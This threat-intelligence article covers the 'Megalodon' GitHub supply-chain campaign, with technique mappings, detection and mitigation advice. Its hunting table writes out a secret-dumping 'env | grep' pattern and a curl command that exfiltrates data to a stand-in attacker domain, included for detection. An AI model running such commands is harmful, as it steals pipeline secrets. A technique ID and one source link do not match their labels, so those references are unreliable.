# Megalodon Attack: 5,561 GitHub Repos Compromised in Automated CI/CD Onslaught

**Severity:** critical | **Category:** Supply Chain Attack,Cyberattack,Threat Actor | **Updated:** 2026-05-27 | **Reading time:** 6 min

A massive, automated supply chain attack dubbed "Megalodon" has compromised 5,561 public GitHub repositories. The threat actor, TeamPCP, leveraged compromised developer credentials to inject malicious CI/CD workflows, aiming to exfiltrate secrets. The campaign, executed in just six hours, shows a dual motivation of financial gain and geopolitical disruption, with wiper malware deployed against targets in Iran and Israel, demonstrating the sophisticated and scalable nature of modern software supply chain threats.

## Executive Summary
Within a six-hour window on May 18, 2026, the threat actor **TeamPCP** executed a large-scale, automated supply chain attack codenamed "Megalodon." The campaign successfully compromised 5,561 public **[GitHub](https://github.com)** repositories by injecting malicious CI/CD workflows. The primary objective was the exfiltration of sensitive secrets and credentials from affected software projects. The attack leveraged compromised developer credentials, likely obtained through infostealer malware. Evidence of destructive wiper malware deployed against targets in Iran and Israel suggests a complex motivation combining financial gain with geopolitical objectives. This incident highlights the critical vulnerability of CI/CD pipelines and the increasing automation used by threat actors to execute attacks at scale.

---

## Threat Overview
The Megalodon campaign represents a sophisticated evolution in supply chain attacks. The threat actor, **TeamPCP**, known for both financially and geopolitically motivated operations, orchestrated the attack with precision and speed. The initial access vector was the compromise of developer GitHub accounts, with analysis indicating a strong correlation to infostealer malware logs. Once access was gained, the attackers pushed 5,718 malicious commits across the 5,561 repositories.

To obscure their actions, the attackers used throwaway GitHub accounts with forged author identities, such as `build-bot` and `ci-bot`. The core of the attack was the modification of CI/CD workflow files (e.g., within the `.github/workflows/` directory) to include steps that exfiltrated environment variables, secrets, and other credentials to a remote command-and-control (C2) server. The campaign's impact was widespread, affecting open-source projects, cloud infrastructure tools, developer utilities, and cryptocurrency platforms.

---

## Technical Analysis
The attack chain demonstrates a clear understanding of modern software development practices and their inherent weaknesses.

1.  **Initial Access**: The campaign began with the compromise of developer accounts. Evidence suggests this was achieved through infostealer malware campaigns targeting developers' machines. This aligns with the MITRE ATT&CK technique [`T1555 - Credentials from Password Stores`](https://attack.mitre.org/techniques/T1555/).

2.  **Execution & Persistence**: Using the compromised credentials ([`T1078 - Valid Accounts`](https://attack.mitre.org/techniques/T1078/)), **TeamPCP** automated the process of pushing malicious commits. They modified CI/CD pipeline configurations, a technique known as [`T1137.004 - CI/CD Pipeline Modification`](https://attack.mitre.org/techniques/T1137/004/). This modification acted as a persistence mechanism, ensuring the malicious code would execute whenever the CI/CD pipeline was triggered (e.g., on a new push or pull request).

3.  **Exfiltration**: The malicious workflows were designed to capture sensitive data. This included API keys, tokens, and other secrets stored in the CI/CD environment. The data was then exfiltrated to an attacker-controlled C2 server, consistent with [`T1537 - Transfer Data to Cloud Account`](https://attack.mitre.org/techniques/T1537/).

4.  **Impact**: Beyond data theft, the campaign included a destructive component. In targeted attacks against entities in Iran and Israel, the attackers deployed wiper malware. This use of [`T1485 - Data Destruction`](https://attack.mitre.org/techniques/T1485/) indicates a dual purpose, aiming to cause disruption and damage in addition to espionage or financial gain.

---

## Impact Assessment
The Megalodon campaign has significant and far-reaching implications. For the 5,561 affected projects, the immediate impact is the potential theft of critical secrets, which could lead to further compromise of production systems, cloud infrastructure, and user data. The reputational damage to these projects, many of which are open-source and rely on community trust, is substantial. The attack's broad targeting across sectors like cloud infrastructure and cryptocurrency means that the stolen credentials could be used to attack a wide array of downstream services and organizations. The geopolitical dimension, with destructive attacks on Iranian and Israeli targets, elevates this from a standard cybercrime event to a hybrid operation with potential nation-state involvement or alignment.

---

## IOCs — Directly from Articles
No specific file hashes, IP addresses, or domains were mentioned in the source articles.

---

## Cyber Observables — Hunting Hints
Security teams may want to hunt for the following patterns to identify similar CI/CD compromises:

| Type | Value | Description |
|---|---|---|
| `command_line_pattern` | `env \| grep -E "(SECRET|TOKEN|KEY|PASSWORD)"` | Suspicious command in CI/CD logs attempting to list environment variables containing secrets. |
| `command_line_pattern` | `curl -X POST -d @- <attacker-domain>` | Common pattern for exfiltrating data captured from previous pipeline steps to an external server. |
| `user_account_pattern` | `build-bot` or `ci-bot` | Look for commits from generic or suspicious author names not aligned with known team members or official bots. |
| `file_path` | `.github/workflows/*.yml` | Monitor for unexpected or unauthorized modifications to GitHub Actions workflow files. |
| `network_traffic_pattern` | Outbound connections from CI/CD runners to non-standard or uncategorized domains. | CI/CD runners should typically only connect to known package registries, APIs, and cloud provider endpoints. |

---

## Detection & Response
Detection of this activity requires a defense-in-depth approach focused on the software development lifecycle.

1.  **Log Analysis**: Regularly audit **[GitHub](https://github.com)** audit logs for suspicious sign-ins, particularly from unusual locations or IP addresses. Analyze CI/CD execution logs for anomalous commands, network connections, or script executions. D3FEND's [`D3-NTA: Network Traffic Analysis`](https://d3fend.mitre.org/technique/d3f:NetworkTrafficAnalysis) is critical here.

2.  **Commit Monitoring**: Implement automated scanning of all incoming commits and pull requests to look for suspicious changes, especially in CI/CD configuration files. Check for commits from new or unverified authors.

3.  **Secret Scanning**: Use tools to scan code repositories and CI/CD logs for inadvertently exposed secrets. This can provide an early warning that credentials have been compromised or are at risk.

4.  **Endpoint Detection**: Since the initial vector was likely infostealers, a robust EDR solution on developer workstations is crucial for detecting the malware that steals credentials in the first place. This aligns with [`D3-PA: Process Analysis`](https://d3fend.mitre.org/technique/d3f:ProcessAnalysis).

---

## Mitigation
Organizations should implement the following controls to defend against such supply chain attacks:

1.  **Enforce Multi-Factor Authentication (MFA)**: Mandate MFA for all developer accounts on platforms like **[GitHub](https://github.com)**. This is the single most effective control against credential compromise. See [`M1032 - Multi-factor Authentication`](https://attack.mitre.org/mitigations/M1032/).

2.  **Implement Principle of Least Privilege**: CI/CD jobs should only have access to the secrets they absolutely require to function. Avoid using long-lived, overly permissive tokens. Use short-lived credentials where possible.

3.  **Require Signed Commits**: Enforce policies that require developers to sign their commits with GPG keys. This makes it much harder for an attacker with stolen credentials to impersonate a developer. This relates to [`M1045 - Code Signing`](https://attack.mitre.org/mitigations/M1045/).

4.  **Harden CI/CD Pipelines**: Implement branch protection rules to require reviews for any changes to workflow files. Use third-party GitHub Apps that can scan and validate CI/CD workflows for malicious patterns before they are run. This is a form of D3FEND's [`D3-ACH: Application Configuration Hardening`](https://d3fend.mitre.org/technique/d3f:ApplicationConfigurationHardening).

**Tags:** Megalodon, TeamPCP, CI/CD, GitHub Actions, Wiper, Infostealer

## Sources
- [Over 5,500 GitHub Repositories Infected in ‘Megalodon’ Supply Chain Attack](https://www.securityweek.com/docketwise-data-breach-impacts-143000/) — SecurityWeek (2026-05-25)
- [Megalodon Supply Chain Attack: TeamPCP Compromises 5,561 GitHub Repositories via Malicious CI/CD Workflows](https://www.rescana.ai/blog/megalodon-supply-chain-attack-teamtcp-compromised-5561-github-repositories) — Rescana (2026-05-24)

---
Source: https://cyber.netsecops.io/articles/megalodon-supply-chain-attack-hits-over-5500-github-repositories/
